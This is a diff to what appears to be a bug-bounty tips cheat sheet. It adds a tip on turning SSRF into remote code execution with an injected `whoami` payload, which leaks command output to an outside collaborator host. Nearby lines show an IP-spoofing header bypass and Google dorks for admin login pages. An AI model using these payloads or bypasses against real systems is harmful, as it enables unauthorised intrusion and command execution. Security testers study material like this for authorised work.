@@ -41,7 +41,12 @@
                     2. The final url is like url/dest?jwt=vulnerable-jwt-token. 
                     (jwt= paramter was decoding the provided jwt token and show's it into the page). 
 36- always use TRACE instead of GET to know the way of request and hidden headers and if found X-Custom-Ip-Authorization: put 127.0.0.1
-
+37- easy RCE from SSRF
+          If you got HTTP pingback on your server, also give this a try
+          payload used   :  `whoami`.collaborator-url 
+          got callback from  :  root.collaborator-url
+        
+        
 google dorks :   
   site:target.com inurl:adminintitle:login 
   site:website.comintitle:/admin 
